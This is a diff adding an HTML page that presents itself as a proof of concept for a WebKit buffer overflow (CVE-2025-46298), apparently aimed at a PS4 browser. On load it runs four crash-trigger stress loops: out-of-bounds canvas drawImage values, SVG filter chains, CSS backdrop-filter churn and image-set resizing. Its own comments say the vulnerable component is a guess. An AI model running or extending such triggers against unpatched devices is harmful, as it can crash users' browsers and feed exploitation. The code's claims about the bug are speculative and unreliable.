@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<!--
+  PoC: CVE-2025-46298
+  Tipo: Buffer Overflow — WebKit WebCore
+  Pesquisadores: Hossein Lotfi (@hosselot) + Nan Wang (@eternalsakura13)
+  Fix: "improved memory handling" (Bugzilla 301468)
+  Advisory: Safari 26.2, atualização de 9 Janeiro 2026
+  
+  HIPÓTESE DO COMPONENTE:
+  Colaboração INCOMUM entre dois pesquisadores top-tier sugere:
+  a) Bug difícil de reproduzir / exige conhecimento de ambas as áreas
+  b) Lotfi (decoders/ZDI) + Nan Wang (CSS layout) = interseção
+  c) Área provável: renderização de imagens DENTRO de CSS/SVG
+     (ex: CSS background-image, SVG <image>, CSS masking/clipping
+     com imagens, CSS filter com input de imagem)
+  d) Outra candidata: Canvas 2D drawImage() com source fora dos limites
+  
+  Buffer Overflow com fix "improved memory handling":
+  - Cálculo incorreto de tamanho de buffer para output de decoder
+  - Write além dos limites de um buffer de pixels
+  - Provável em: CSS image-set(), canvas.drawImage() com região
+    recortada, SVG filter feImage, CSS paint() worklet com imagem,
+    ou CSS backdrop-filter
+    
+  ESTRATÉGIA:
+  1. CSS background-image com múltiplos formatos e sizes extremos
+  2. Canvas drawImage() com parâmetros de recorte nos limites/além
+  3. SVG <feImage> + <feComposite> com dimensões extremas
+  4. CSS filter: blur() / drop-shadow() em imagens grandes
+-->
+<html>
+<head>
+<meta charset="UTF-8">
+<title>CVE-2025-46298 PoC — Buffer Overflow CSS/Image</title>
+<style>
+  body { background:#0a0a0a; color:#ff88cc; font-family:monospace; padding:16px; }
+  #log { background:#111; border:1px solid #ff88cc; padding:12px;
+         height:320px; overflow-y:auto; font-size:12px; }
+  .ok{color:#00ff88} .fail{color:#ff4444} .info{color:#ffbb00} .crash{color:#ff00ff;font-weight:bold}
+</style>
+</head>
+<body>
+<h3>CVE-2025-46298 — Buffer Overflow CSS+Image (Lotfi + Nan Wang)</h3>
+<div id="log"></div>
+
+<script>
+"use strict";
+const L=(m,c)=>{const d=document.getElementById('log');
+  d.innerHTML+=`<div class="${c||'info'}">[${Date.now()%100000}] ${m}</div>`;
+  d.scrollTop=d.scrollHeight;};
+
+L("=== CVE-2025-46298 PoC Iniciado ===");
+
+// =============================================================
+// Helper: gerar canvas com pixels coloridos de tamanho variável
+// =============================================================
+function makeCanvas(w, h, r, g, b) {
+  const c = document.createElement('canvas');
+  c.width = w; c.height = h;
+  const ctx = c.getContext('2d');
+  if (!ctx) return c;
+  // Gradiente para maximizar complexidade do buffer
+  const grad = ctx.createLinearGradient(0, 0, w, h);
+  grad.addColorStop(0, `rgb(${r},${g},${b})`);
+  grad.addColorStop(0.5, `rgb(${(r+128)%256},${(g+64)%256},${b})`);
+  grad.addColorStop(1, `rgb(${r},${(g+192)%256},${(b+64)%256})`);
+  ctx.fillStyle = grad;
+  ctx.fillRect(0, 0, w, h);
+  // Adicionar alguns shapes para complexidade
+  ctx.strokeStyle = `rgba(${r},${g},${b},0.5)`;
+  ctx.lineWidth = 2;
+  for (let i = 0; i < 5; i++) {
+    ctx.beginPath();
+    ctx.arc(w/2, h/2, (i+1) * Math.min(w,h)/12, 0, Math.PI*2);
+    ctx.stroke();
+  }
+  return c;
+}
+
+// =============================================================
+// VARIANTE 1: Canvas drawImage() com parâmetros de recorte
+// nos limites exatos e além dos limites do source
+// Possível buffer overflow no path de clipping
+// =============================================================
+function variant1_canvas_drawimage_oob() {
+  return new Promise(resolve => {
+    L("[V1] Canvas drawImage() boundary stress...");
+
+    const dst = document.createElement('canvas');
+    dst.width = 512; dst.height = 512;
+    const ctx = dst.getContext('2d');
+    if (!ctx) { L("[V1] Canvas não suportado", "fail"); resolve(); return; }
+
+    // Source images de tamanhos variados
+    const sources = [
+      makeCanvas(1, 1, 255, 0, 0),
+      makeCanvas(3, 3, 0, 255, 0),
+      makeCanvas(255, 255, 0, 0, 255),
+      makeCanvas(256, 256, 255, 255, 0),
+      makeCanvas(257, 257, 0, 255, 255),
+      makeCanvas(512, 512, 128, 128, 128),
+      makeCanvas(1023, 1, 200, 100, 50),
+      makeCanvas(1, 1023, 50, 100, 200),
+    ];
+
+    let ops = 0;
+    const TOTAL = 2000;
+
+    function doOp() {
+      if (ops >= TOTAL) {
+        L(`[V1] ${TOTAL} drawImage ops OK`, "ok");
+        resolve(); return;
+      }
+
+      const src = sources[ops % sources.length];
+      const sw = src.width;
+      const sh = src.height;
+
+      // Testar parâmetros nos limites exatos e ligeiramente além
+      // Estes são os casos que tipicamente causam buffer overflow:
+      const sx_variants = [0, sw-1, sw, sw+1, -1, sw/2, sw*2];
+      const sy_variants = [0, sh-1, sh, sh+1, -1, sh/2, sh*2];
+      const sWidth_variants = [1, sw, sw+1, sw-1, 0, sw*2, -1];
+
+      const sx = sx_variants[ops % sx_variants.length];
+      const sy = sy_variants[(ops * 3) % sy_variants.length];
+      const sWidth = sWidth_variants[(ops * 7) % sWidth_variants.length];
+      const sHeight = sWidth_variants[(ops * 11) % sWidth_variants.length];
+
+      try {
+        // 9-arg form: drawImage(src, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight)
+        ctx.drawImage(src,
+          sx, sy, sWidth, sHeight,
+          0, 0, 512, 512
+        );
+
+        // Também testar com ImageData input
+        if (ops % 50 === 0) {
+          try {
+            const id = ctx.getImageData(0, 0, 512, 512);
+            ctx.putImageData(id, -1, -1, 0, 0, 513, 513);
+          } catch(e) {}
+        }
+      } catch(e) { /* erros de parâmetros inválidos são esperados */ }
+
+      ops++;
+      if (ops % 200 === 0) {
+        setTimeout(doOp, 0);
+      } else {
+        doOp();
+      }
+    }
+    doOp();
+  });
+}
+
+// =============================================================
+// VARIANTE 2: SVG feImage + filter chain buffer overflow
+// feImage carrega imagem e a processa através de filtros SVG
+// O buffer de output pode ser calculado incorretamente
+// =============================================================
+function variant2_svg_filter_image() {
+  return new Promise(resolve => {
+    L("[V2] SVG feImage + filter chain...");
+    const svgNS = "http://www.w3.org/2000/svg";
+
+    // Criar data URI de uma imagem PNG 256x256
+    const imgCanvas = makeCanvas(256, 256, 128, 64, 192);
+    const imgDataURI = imgCanvas.toDataURL('image/png');
+
+    for (let iter = 0; iter < 30; iter++) {
+      const svg = document.createElementNS(svgNS, 'svg');
+      svg.setAttribute('width', '512');
+      svg.setAttribute('height', '512');
+      svg.style.cssText = 'position:absolute;top:-9999px';
+
+      const defs = document.createElementNS(svgNS, 'defs');
+
+      // Criar filter com chain de processamento de imagem
+      const filter = document.createElementNS(svgNS, 'filter');
+      filter.setAttribute('id', 'f' + iter);
+      filter.setAttribute('x', '-50%'); filter.setAttribute('y', '-50%');
+      filter.setAttribute('width', '200%'); filter.setAttribute('height', '200%');
+      filter.setAttribute('color-interpolation-filters', 'sRGB');
+
+      // feImage: carrega imagem externa no pipeline do filtro
+      const feImg = document.createElementNS(svgNS, 'feImage');
+      feImg.setAttribute('href', imgDataURI);
+      feImg.setAttribute('result', 'img');
+      // Dimensões que podem causar buffer size mismatch
+      feImg.setAttribute('x', String(-iter));
+      feImg.setAttribute('y', String(-iter));
+      feImg.setAttribute('width', String(256 + iter * 2));
+      feImg.setAttribute('height', String(256 + iter * 2));
+      feImg.setAttribute('preserveAspectRatio', 'none');
+      filter.appendChild(feImg);
+
+      // feComposite: opera sobre a imagem
+      const feComp = document.createElementNS(svgNS, 'feComposite');
+      feComp.setAttribute('in', 'img');
+      feComp.setAttribute('in2', 'SourceGraphic');
+      feComp.setAttribute('operator', ['over','in','out','atop','xor','arithmetic'][iter%6]);
+      feComp.setAttribute('result', 'comp');
+      filter.appendChild(feComp);
+
+      // feConvolveMatrix: kernel convolution (intenso em memória)
+      const feConv = document.createElementNS(svgNS, 'feConvolveMatrix');
+      feConv.setAttribute('in', 'comp');
+      feConv.setAttribute('order', '3');
+      feConv.setAttribute('kernelMatrix', '0 -1 0 -1 5 -1 0 -1 0');
+      feConv.setAttribute('edgeMode', ['duplicate','wrap','none'][iter%3]);
+      feConv.setAttribute('preserveAlpha', iter % 2 === 0 ? 'true' : 'false');
+      feConv.setAttribute('result', 'conv');
+      filter.appendChild(feConv);
+
+      // feComponentTransfer com parâmetros extremos
+      const feCT = document.createElementNS(svgNS, 'feComponentTransfer');
+      feCT.setAttribute('in', 'conv');
+      ['feFuncR','feFuncG','feFuncB','feFuncA'].forEach((fn, i) => {
+        const f = document.createElementNS(svgNS, fn);
+        f.setAttribute('type', ['linear','gamma','table','discrete'][i]);
+        f.setAttribute('slope', String(0.5 + iter * 0.1));
+        f.setAttribute('intercept', String(-0.1 * iter));
+        f.setAttribute('tableValues', '0 0.2 0.4 0.6 0.8 1.0');
+        feCT.appendChild(f);
+      });
+      filter.appendChild(feCT);
+
+      defs.appendChild(filter);
+      svg.appendChild(defs);
+
+      // Rect que usa o filtro
+      const rect = document.createElementNS(svgNS, 'rect');
+      rect.setAttribute('x', '0'); rect.setAttribute('y', '0');
+      rect.setAttribute('width', '512'); rect.setAttribute('height', '512');
+      rect.setAttribute('filter', `url(#f${iter})`);
+      rect.setAttribute('fill', 'rgba(0,128,255,0.5)');
+      svg.appendChild(rect);
+
+      document.body.appendChild(svg);
+      void svg.getBoundingClientRect(); // forçar render
+      document.body.removeChild(svg);
+    }
+
+    L("[V2] SVG filter chain stress OK", "ok");
+    resolve();
+  });
+}
+
+// =============================================================
+// VARIANTE 3: CSS backdrop-filter + clip-path em imagens
+// Buffer size calculado incorretamente para operações compostas
+// =============================================================
+function variant3_css_backdrop_filter() {
+  return new Promise(resolve => {
+    L("[V3] CSS backdrop-filter + clip-path stress...");
+
+    const container = document.createElement('div');
+    container.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:-1;overflow:hidden';
+
+    // Background com gradiente complexo
+    container.style.background = 'linear-gradient(45deg, #ff0000, #00ff00, #0000ff, #ffff00, #ff00ff)';
+
+    // Imagem background
+    const imgCanvas = makeCanvas(512, 512, 200, 100, 50);
+    container.style.backgroundImage = `url(${imgCanvas.toDataURL()})`;
+
+    document.body.appendChild(container);
+
+    const elements = [];
+    // Criar elementos com backdrop-filter em diferentes formas
+    const clipPaths = [
+      'circle(50%)',
+      'ellipse(40% 60% at 50% 50%)',
+      'polygon(50% 0%, 100% 100%, 0% 100%)',
+      'polygon(20% 0%, 80% 0%, 100% 100%, 0% 100%)',
+      'inset(10% round 20px)',
+      'path("M 0 0 L 100 0 L 100 100 Z")',
+    ];
+
+    const filterFns = [
+      'blur(10px)',
+      'brightness(2) contrast(0.5)',
+      'saturate(3) hue-rotate(45deg)',
+      'blur(5px) brightness(1.5) saturate(2)',
+      'drop-shadow(10px 10px 20px rgba(0,0,0,0.5))',
+      'invert(1) hue-rotate(180deg)',
+      'blur(20px) contrast(2) brightness(0.5)',
+    ];
+
+    for (let i = 0; i < 50; i++) {
+      const el = document.createElement('div');
+      const size = 50 + (i * 10) % 300;
+      el.style.cssText = `
+        position: absolute;
+        left: ${(i * 30) % 800}px;
+        top: ${(i * 17) % 400}px;
+        width: ${size}px;
+        height: ${size}px;
+        backdrop-filter: ${filterFns[i % filterFns.length]};
+        -webkit-backdrop-filter: ${filterFns[i % filterFns.length]};
+        clip-path: ${clipPaths[i % clipPaths.length]};
+        background: rgba(255,255,255,0.1);
+        overflow: hidden;
+      `;
+      container.appendChild(el);
+      elements.push(el);
+    }
+
+    // Forçar múltiplos repaints enquanto modifica clip-paths e filters
+    let step = 0;
+    const STEPS = 100;
+    const interval = setInterval(() => {
+      step++;
+      for (let i = 0; i < elements.length; i++) {
+        if (elements[i].parentNode) {
+          // Alterar clip-path e filter a cada frame
+          elements[i].style.clipPath = clipPaths[(i + step) % clipPaths.length];
+          elements[i].style.backdropFilter = filterFns[(i * step) % filterFns.length];
+          elements[i].style.webkitBackdropFilter = filterFns[(i * step) % filterFns.length];
+          // Mudar tamanho (força recálculo de buffer)
+          const newSize = 50 + ((step + i * 7) % 300);
+          elements[i].style.width = newSize + 'px';
+          elements[i].style.height = newSize + 'px';
+        }
+      }
+
+      if (step >= STEPS) {
+        clearInterval(interval);
+        try { document.body.removeChild(container); } catch(e) {}
+        L("[V3] CSS backdrop-filter stress OK", "ok");
+        resolve();
+      }
+    }, 16); // ~60fps
+  });
+}
+
+// =============================================================
+// VARIANTE 4: CSS image-set() + paint() com múltiplos formatos
+// =============================================================
+function variant4_css_image_set() {
+  return new Promise(resolve => {
+    L("[V4] CSS image-set() multi-format stress...");
+
+    // Gerar imagens em diferentes tamanhos e densidades
+    const imgs = {};
+    [1, 2, 3, 4].forEach(dpr => {
+      const size = 100 * dpr;
+      imgs[dpr] = makeCanvas(size, size, dpr * 60, dpr * 40, dpr * 80).toDataURL('image/png');
+    });
+
+    const container = document.createElement('div');
+    container.style.cssText = 'position:absolute;top:-9999px;width:1000px;height:1000px';
+    document.body.appendChild(container);
+
+    // Criar elementos com image-set()
+    for (let i = 0; i < 100; i++) {
+      const el = document.createElement('div');
+      // image-set() com múltiplas densidades — o engine escolhe
+      // baseado no device pixel ratio, possível path de decisão bugado
+      el.style.cssText = `
+        width: ${50 + i}px;
+        height: ${50 + i}px;
+        background-image: image-set(
+          url("${imgs[1]}") 1x,
+          url("${imgs[2]}") 2x,
+          url("${imgs[3]}") 3x,
+          url("${imgs[4]}") 4x
+        );
+        background-size: cover;
+        background-repeat: no-repeat;
+        float: left;
+      `;
+      container.appendChild(el);
+    }
+
+    // Forçar repaints com mudanças de DPR simuladas
+    void container.offsetWidth;
+
+    // Mudar tamanhos em loop para forçar re-seleção da imagem
+    let step = 0;
+    const interval = setInterval(() => {
+      step++;
+      const children = container.children;
+      for (let i = 0; i < children.length; i++) {
+        const newSize = 30 + ((i + step * 3) % 150);
+        children[i].style.width = newSize + 'px';
+        children[i].style.height = newSize + 'px';
+        children[i].style.backgroundSize = step % 2 === 0 ? 'cover' : 'contain';
+      }
+      void container.offsetWidth;
+
+      if (step >= 100) {
+        clearInterval(interval);
+        try { document.body.removeChild(container); } catch(e) {}
+        L("[V4] CSS image-set() stress OK", "ok");
+        resolve();
+      }
+    }, 10);
+  });
+}
+
+// =============================================================
+// Executor
+// =============================================================
+async function main() {
+  try {
+    await variant1_canvas_drawimage_oob();
+    await variant2_svg_filter_image();
+    await variant3_css_backdrop_filter();
+    await variant4_css_image_set();
+    L("=== COMPLETO ===", "ok");
+    L("Crash do browser = CVE-2025-46298 PRESENTE no PS4 13.04", "crash");
+    L("Sem crash = patched ou trigger precisa refinamento", "info");
+  } catch(e) {
+    L("EXCEÇÃO FATAL: " + e.toString(), "fail");
+  }
+}
+window.addEventListener('load', () => setTimeout(main, 300));
+</script>
+</body>
+</html>
